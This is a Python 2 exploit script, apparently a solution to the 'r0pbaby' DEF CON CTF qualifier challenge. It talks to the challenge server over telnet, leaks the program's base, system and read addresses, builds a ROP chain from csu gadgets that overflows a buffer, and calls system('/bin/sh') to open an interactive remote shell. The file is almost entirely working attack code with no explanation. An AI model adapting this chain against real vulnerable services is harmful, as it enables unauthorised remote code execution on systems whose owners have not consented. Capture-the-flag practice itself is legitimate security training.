import telnetlib
import commands
import struct

host = 'r0pbaby_542ee6516410709a1421141501f03760.quals.shallweplayaga.me'
port = 10436

#host = "localhost"
#port = 1234

tn = telnetlib.Telnet(host,port)
#raw_input("use gdb!")
print tn.read_until("Exit")

print tn.read_until(": ")
tn.write("1\n")
print tn.read_until(": ")
base_addr = tn.read_until(": ")
print base_addr
base_addr = base_addr.split("\n")[0]
base_addr = int(base_addr,16) + 0x3650
print "[+] Got base addr : 0x%x" % base_addr

tn.write("2\n")
print tn.read_until(": ")
tn.write("system\n")
print tn.read_until(": ")
s_addr = tn.read_until(": ")
print s_addr
s_addr = s_addr.split("\n")[0]
s_addr = int(s_addr,16)
print "[+] Got system addr : 0x%x" % s_addr

tn.write("2\n")
print tn.read_until(": ")
tn.write("read\n")
print tn.read_until(": ")
r_addr = tn.read_until(": ")
print r_addr
r_addr = r_addr.split("\n")[0]
r_addr = int(r_addr,16)
print "[+] Got read addr : 0x%x" % r_addr

addr_set_regs = 0xf16 + base_addr         # add rsp,0x8;pop rbx/rbp/r12/r13/r14/r15; ret
addr_call_r12 = 0xf00 + base_addr         # mov rdx, r13; mov rsi, r14; mov edi, r15d; call [r12+rbx*8];
                               # -> add rbx, 0x1; cmp rbx, rbp; jne addr_call_r12; to addr_set_regs
alarm_got = 0x202020 + base_addr
addr_ret = 0xf24 + base_addr              # ret

binsh_addr = base_addr - 0x3650 + 0x204650 + 0x200

buf = "A"*8
buf += struct.pack('<Q', addr_set_regs)
buf += 'AAAAAAAA'
buf += struct.pack('<Q', 0)               # rbx == 0
buf += struct.pack('<Q', 1)               # rbp == rbx+1
buf += struct.pack('<Q', alarm_got)       # r12 -> call [r12]
buf += struct.pack('<Q', 8)              # r13 -> rdx
buf += struct.pack('<Q', binsh_addr)      # r14 -> rsi
buf += struct.pack('<Q', 100)             # r15 -> edi
buf += struct.pack('<Q', addr_call_r12)
buf += 'AAAAAAAA'
buf += struct.pack('<Q', 0)               # rbx == 0
buf += struct.pack('<Q', 1)               # rbp == rbx+1
buf += struct.pack('<Q', s_addr)          # r12 -> call [r12]
buf += struct.pack('<Q', 0)               # r13 -> rdx
buf += struct.pack('<Q', 0)               # r14 -> rsi
buf += struct.pack('<Q', binsh_addr)      # r15 -> edi
buf += struct.pack('<Q', 0xf23 + base_addr) # 0x00000f23: pop rdi ; ret  ;  (1 found)
buf += struct.pack('<Q', 0) # rdi
buf += struct.pack('<Q', r_addr)
buf += struct.pack('<Q', 0xf23 + base_addr) # 0x00000f23: pop rdi ; ret  ;  (1 found)
buf += struct.pack('<Q', binsh_addr) # rdi
buf += struct.pack('<Q', s_addr)

tn.write("3\n")
print tn.read_until(": ")
tn.write("%d\n" % (len(buf)+1))
s = tn.get_socket()
s.send(buf + "\n")
tn.write("4\n")
print tn.read_until("Exiting.")
tn.write('/bin/sh\x00')
tn.interact()
